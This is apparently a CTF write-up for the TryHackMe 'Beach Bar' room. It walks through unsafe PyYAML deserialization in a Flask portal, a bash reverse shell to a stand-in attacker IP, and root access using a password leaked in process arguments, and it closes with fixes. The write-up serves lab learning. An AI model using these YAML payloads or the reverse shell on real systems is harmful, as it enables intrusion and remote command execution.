# Beach Bar - TryHackMe Writeup

> Sanitized walkthrough. Flags and recovered credential values are intentionally redacted.

## Summary

Beach Bar is a Linux CTF room with a small Flask web portal. The path is:

1. Find the demo DJ login in the login page source.
2. Use the authenticated playlist import feature.
3. Abuse unsafe PyYAML deserialization to execute commands.
4. Catch a reverse shell as the low-privileged `bartender` user.
5. Enumerate running processes and find a root-owned process leaking a password in its command line.
6. Use that leaked password with `su root`.

## Enumeration

Ping the host:

```bash
ping -c 4 <TARGET_IP>
```

Check the web service:

```bash
curl -i http://<TARGET_IP>/
curl -i http://<TARGET_IP>/login
```

The root path redirects to `/login`, and the login page source contains an HTML comment with the demo DJ credentials. Use those credentials to sign in through the web portal.

## Authenticated Portal

After logging in, the useful pages are:

```text
/dashboard
/import
/export
```

The export endpoint returns a YAML playlist. The import endpoint accepts pasted YAML or an uploaded `.yml` / `.yaml` file.

## Unsafe YAML Deserialization

The import feature parses user-controlled YAML with an unsafe PyYAML loader. Test command execution with a harmless command:

```yaml
!!python/object/apply:subprocess.check_output
- ["id"]
```

If successful, the imported result shows output similar to:

```text
uid=1001(bartender) gid=1001(bartender) groups=1001(bartender)
```

An `os.system` test also works, but only returns the command exit code:

```yaml
!!python/object/apply:os.system
- "id"
```

## Reverse Shell

Start a listener on the attack machine:

```bash
nc -lvnp 4444
```

Submit this YAML through `/import`, replacing `<ATTACKER_IP>` with your VPN/interface IP:

```yaml
!!python/object/apply:os.system
- "bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'"
```

Once the callback lands, stabilize the shell:

```bash
export HOME=/home/bartender
export SHELL=/bin/bash
export TERM=xterm
python3 -c 'import pty; pty.spawn("/bin/bash")'
cd /home/bartender
```

Read the user flag:

```bash
cat /home/bartender/user.txt
```

Flag value is redacted.

## Privilege Escalation

Enumerate local services and running processes:

```bash
ps auxww | grep -i jukebox
ps auxww | grep -i gunicorn
```

A root-owned Python service runs the jukebox daemon and exposes a password as a command-line argument:

```text
root ... /opt/beach-bar/jukeboxd/jukeboxd.py --stream-pass <REDACTED_PASSWORD> --bitrate 320k
```

Command-line arguments are visible to local users through `ps` and `/proc/<PID>/cmdline`, so secrets should never be passed this way.

Use the leaked value with `su root`:

```bash
su root
```

Enter the recovered `--stream-pass` value when prompted.

Confirm root:

```bash
whoami
id
```

Read the root flag:

```bash
cat /root/root.txt
```

Flag value is redacted.

## Root Cause

The full chain worked because of three separate mistakes:

```text
Demo credentials in page source
        ->
Unsafe YAML deserialization
        ->
Command execution as bartender
        ->
Root password leaked in process arguments
        ->
Root shell
```

## Fixes

- Remove demo credentials and comments containing secrets.
- Use `yaml.safe_load()` or `yaml.SafeLoader` for untrusted YAML.
- Do not pass secrets as command-line arguments.
- Store service secrets in protected files or a proper secret manager.
- Rotate exposed passwords after disclosure.
